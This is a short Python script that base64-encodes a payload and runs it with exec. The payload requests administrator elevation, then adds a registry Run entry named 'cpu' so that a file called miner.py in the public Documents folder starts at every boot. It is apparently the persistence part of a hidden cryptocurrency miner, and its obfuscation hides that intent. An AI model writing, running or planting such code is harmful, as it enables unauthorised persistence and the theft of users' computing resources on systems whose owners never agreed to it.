import base64

code = base64.b64encode(br"""
import ctypes
import sys
import winreg

program_exe = "c:\\users\\public\\Documents\\miner.py"
# program_exe = "notepad.exe"


def main():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        exit()
    key_path = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
    values = get_values(key_path)
    if program_exe not in values:
        add_to_reg(key_path, "cpu", program_exe)
    print("LOLLLS")


def get_values(key_path):
    key = winreg.OpenKey(
        winreg.HKEY_LOCAL_MACHINE,
        key_path,
        0, winreg.KEY_READ)
    return sub_values(key)


def sub_values(key):
    i = 0
    values = []
    while True:
        try:
            value = winreg.EnumValue(key, i)
            values.append(value)
            i += 1
        except WindowsError as e:
            break
    return values


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def add_to_reg(key_path, name, exe):
    key = winreg.OpenKey(
        winreg.HKEY_LOCAL_MACHINE,
        key_path,
        0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe)


if __name__ == '__main__':
    main()
""")
exec(base64.b64decode(code))
